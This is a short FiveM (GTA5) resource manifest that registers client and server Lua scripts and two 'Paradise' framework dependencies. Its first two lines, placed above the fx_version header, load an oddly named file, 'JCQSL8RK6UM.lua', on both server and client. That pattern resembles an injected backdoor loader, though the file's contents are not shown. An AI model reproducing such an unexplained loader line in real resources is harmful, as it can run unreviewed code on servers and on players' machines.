server_script "JCQSL8RK6UM.lua"
client_script "JCQSL8RK6UM.lua"
fx_version("cerulean")
games({ "gta5" })
lua54("yes")
client_script("@Paradise-base/components/cl_error.lua")
client_script("@Paradise-pwnzor/client/check.lua")

client_scripts({
	"client/**/*.lua",
})

server_scripts({
	"server/**/*.lua",
})
